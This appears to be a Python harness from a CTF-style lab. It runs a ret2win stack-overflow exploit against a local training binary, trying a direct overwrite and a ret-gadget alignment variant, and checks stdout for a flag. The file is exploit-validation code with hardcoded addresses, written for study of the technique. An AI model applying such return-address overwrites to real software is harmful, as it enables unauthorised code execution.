#!/usr/bin/env python3
"""nexus_vault — dynamic validation of the ret2win (local, contract-granted).

Runs the case's own training binary with the solver payload and captures the
transcript. Two variants are attempted because a ret targeting `win` (which
itself calls puts@libc) can hit a 16-byte stack-alignment fault inside libc:

  A) 72 padding bytes + win@0x401176                      (direct)
  B) 72 padding bytes + ret@0x40101a + win@0x401176       (alignment fix)

Policy: contract v2 (`allow_dynamic_debugging: true`, sha cac247233c6b,
operator opencode-for-kai). Local artifact only; no network, no external target.
"""
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "solver"))

from exploit_solver import build_payload  # noqa: E402

TARGET = ROOT / "target" / "vault"
WIN = 0x401176
RET = 0x40101A  # bare `ret` in _init


def run(name: str, payload: bytes) -> dict:
    print(f"\n=== variant {name} ({len(payload)} bytes) ===")
    try:
        r = subprocess.run([str(TARGET)], input=payload,
                           capture_output=True, timeout=10)
        out = r.stdout.decode(errors="replace")
        err = r.stderr.decode(errors="replace")
        print(f"exit={r.returncode}  signal={-r.returncode if r.returncode < 0 else 'none'}")
        if out:
            for line in out.rstrip().splitlines():
                print("stdout | " + line)
        if err:
            for line in err.rstrip().splitlines()[:4]:
                print("stderr | " + line)
        got_flag = "MITR3{" in out
        print("flag   | " + ("CAPTURED" if got_flag else "not in stdout"))
        return {"variant": name, "exit": r.returncode, "flag": got_flag, "stdout": out}
    except subprocess.TimeoutExpired:
        print("exit=timeout (10s) — processo pendurado")
        return {"variant": name, "exit": "timeout", "flag": False, "stdout": ""}


def main() -> None:
    print("target   :", TARGET)
    print("sha256   :", subprocess.run(["sha256sum", str(TARGET)],
                                        capture_output=True, text=True).stdout.split()[0])
    print("win      : 0x%x   ret-gadget: 0x%x" % (WIN, RET))
    print("payload  :", build_payload().hex())
    a = run("A direct", build_payload())
    b = run("B ret-sled", build_payload()[:-8] + RET.to_bytes(8, "little") + WIN.to_bytes(8, "little"))
    winner = a if a["flag"] else (b if b["flag"] else None)
    print("\nresultado:", f"variante {winner['variant']} levou ao win()" if winner
          else "nenhuma variante imprimiu a flag")
    sys.exit(0 if winner else 1)


if __name__ == "__main__":
    main()
